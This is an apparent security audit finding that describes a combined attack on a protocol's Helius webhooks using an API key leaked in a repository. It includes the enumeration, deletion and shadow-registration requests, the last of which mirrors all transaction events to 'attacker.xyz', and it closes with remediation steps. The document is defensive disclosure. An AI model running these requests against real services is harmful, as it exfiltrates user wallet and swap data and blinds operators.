## Combined Attack Path

H004 alone documents the two attack branches (shadow webhook registration and production webhook deletion) as separate options. This combination finding surfaces the adversarial value of executing **both simultaneously in a single session**, a detail not addressed in H004's impact analysis.

### Prerequisites

Repository read access only (GitHub clone, collaborator token, or any `git` access). No authentication beyond the key already in the repo is required.

### Steps

**Phase 1 — Recon (< 1 minute)**

1. Clone the repository or read `.env.devnet:8`. Extract the key:
   ```
   [REDACTED-DEVNET-HELIUS-KEY]
   ```

2. Enumerate all registered webhooks on the account:
   ```
   GET https://api.helius.xyz/v0/webhooks?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   ```
   Response reveals: production webhook ID, delivery URL (e.g., `https://dr-fraudsworth-production.up.railway.app/api/webhook/helius`), monitored program addresses, and any `authHeader` value configured.

**Phase 2 — Shadow webhook registration (simultaneous, not sequential)**

3. Before touching the production webhook, register a mirrored webhook:
   ```
   POST https://api.helius.xyz/v0/webhooks?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   {
     "webhookURL": "https://attacker.xyz/capture",
     "webhookType": "rawDevnet",
     "transactionTypes": ["ANY"],
     "accountAddresses": ["43fZ...", "4Heq...", "5JsS...", "12b3...", "5uaw...", "DpX3..."]
   }
   ```
   Helius now mirrors every matching transaction to attacker infrastructure. This step is **invisible to the protocol operator** — it produces no on-chain event, no log entry in the production application, and no Helius dashboard alert unless the operator actively checks.

**Phase 3 — Production webhook deletion (simultaneous)**

4. In the same session (or immediately after), delete the production webhook using the ID obtained in step 2:
   ```
   DELETE https://api.helius.xyz/v0/webhooks/{production-id}?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   ```
   The production data pipeline is severed.

### Why Both Simultaneously?

Executing the shadow registration **before** the deletion is the critical ordering. If an attacker only deletes the production webhook, an alert or candle staleness check might prompt the operator to re-create it — and a key rotation would sever the attacker's shadow webhook too. By registering the shadow webhook first:

- The attacker retains full event mirroring even after the operator notices the deletion and rotates the key, **unless** the operator also audits for attacker-created webhooks before rotation.
- The production deletion causes visible service degradation (stale candles, no SSE updates) that diverts operator attention to recovery, not to webhook inventory auditing.
- The shadow webhook silently persists through the outage and recovery period, capturing all swap events, epoch transitions, and VRF results during the highest-attention phase of an incident.

### Data Pipeline Impact of Combined Attack

The candle pipeline path is: Helius → webhook POST → `/api/webhook/helius` → `upsertCandle()` → SSE broadcast to all connected clients.

When the production webhook is deleted:

- `ws-subscriber.ts` continues to receive raw WebSocket events from Helius (it connects directly, not through the webhook), so the server-side WebSocket subscriber is unaffected.
- However, the candle upsert path (`TaxedSwap` → `upsertCandle`) relies on the webhook delivery, not on `ws-subscriber`. The two data paths are independent. Candle data goes stale immediately on deletion.
- SSE clients receive no new candle events. The frontend chart freezes. All users see outdated price/volume data with no error indication.
- The staleness is permanent until the operator manually discovers the webhook is missing and re-creates it.

Meanwhile, the shadow webhook gives the attacker:

- Every `TaxedSwap` event including amounts, directions, and user wallet addresses (swap volume intelligence).
- Every epoch transition event (tax rate changes, VRF seeds, Carnage execution triggers).
- Every bonding curve event (graduation thresholds, treasury movements).
- Awareness of exactly when the production webhook is re-created (the operator's webhook reappears in the Helius account listing), allowing the attacker to delete it again before key rotation.

## Combined Impact

**Severity: HIGH**

| Dimension | Assessment |
|-----------|-----------|
| Confidentiality | All protocol on-chain events mirrored to attacker for the lifetime of the shadow webhook |
| Integrity | Production data pipeline severed; candle data permanently stale until operator manually discovers and recovers |
| Availability | Frontend chart and SSE layer degraded (on-chain protocol unaffected) |
| Persistence | Shadow webhook survives key rotation unless operator audits webhook inventory before generating a new key |
| Detectability | Near-zero — no log entry, no on-chain footprint, no Helius alert for additional webhook creation |
| Operator recovery complexity | High — operator must (1) discover pipeline is down, (2) discover extra webhook exists and delete it, (3) rotate key, (4) re-create production webhook, (5) verify all in the correct order |

The combination is materially worse than either constituent attack alone because the pipeline blinding (production webhook deletion) acts as a distraction that occupies operator attention during the period when the shadow webhook is silently exfiltrating event data. The attacker benefits from the exact moment of maximum operator cognitive load.

## Recommendation

### Immediate (breaks the combined attack at its root)

1. **Rotate the Helius API key.** Log into the Helius dashboard, generate a new API key, update Railway env vars, update `.env.devnet`, update `shared/programs.ts`. The new key must be kept out of version control.

2. **Audit webhook inventory immediately before and after rotation.** Run `GET /webhooks` with the old key first to enumerate any attacker-created shadow webhooks. Delete all unexpected entries before generating the new key. Then repeat the audit with the new key after setup to confirm a clean state.

3. **Add webhook inventory health check to monitoring.** A scheduled job (or crank startup check) that calls `GET /webhooks` and alerts if the count deviates from 1 (the expected production webhook) would detect future shadow registrations quickly.

### Short-term

4. **Remove `HELIUS_API_KEY` from `.env.devnet` and add to `.gitignore`.** See H004 recommendations 3–5 for full remediation steps.

5. **Adopt Helius webhook HMAC signing.** Even if the API key is later re-exposed, HMAC-signed webhooks prevent an attacker from injecting crafted events through a shadow webhook pointing at the production delivery URL. This does not prevent the pipeline-blinding or surveillance attacks, but reduces the price manipulation surface (H004 attack path 3c).

### Long-term

6. **Separate Helius accounts by environment** so a devnet key compromise has zero blast radius on the mainnet webhook.

7. **Treat webhook ID as a secondary secret.** The combination attack requires enumerating the production webhook ID (step 2) before deleting it. If the operator were notified by Helius on webhook deletion (feature request to Helius, or periodic audit job), the deletion step of the combined attack would be detected within minutes.
